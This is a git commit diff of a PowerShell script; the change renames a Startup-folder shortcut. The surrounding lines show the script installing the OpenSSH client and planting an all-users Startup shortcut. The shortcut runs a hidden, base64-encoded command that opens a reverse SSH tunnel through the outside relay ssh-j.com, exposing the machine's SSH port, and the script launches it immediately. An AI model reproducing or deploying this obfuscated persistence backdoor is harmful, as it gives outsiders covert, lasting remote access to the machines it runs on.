7752922eaecde897731f554d11b49b1f33415933
papq1 <101420333+papq1@users.noreply.github.com>
2024-10-27 14:32:24 +0100

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -17,10 +17,10 @@ if ($OpenSSHClient -eq 'NotPresent') {
     Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
 }
   
-$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\papq.lnk")
+$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shortcut.lnk")
 $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 $Shortcut.Arguments = "-windowstyle hidden -EncodedCommand QwA6AFwAVwBJAE4ARABPAFcAUwBcAFMAeQBzAHQAZQBtADMAMgBcAE8AcABlAG4AUwBTAEgAXABzAHMAaAAuAGUAeABlACAAcgBhAG4AZABvAG0AdQBzAGUAcgB0AGUAcwB0AGkAbgBnAEAAcwBzAGgALQBqAC4AYwBvAG0AIAAtAE4AIAAtAFIAIABsAGEAcAB0AG8AcAAxADkAOQA5ADoAMgAyADoAbABvAGMAYQBsAGgAbwBzAHQAOgAyADIA"
 $Shortcut.Save()
 
-Invoke-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\papq.lnk'
+Invoke-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\shortcut.lnk'
 
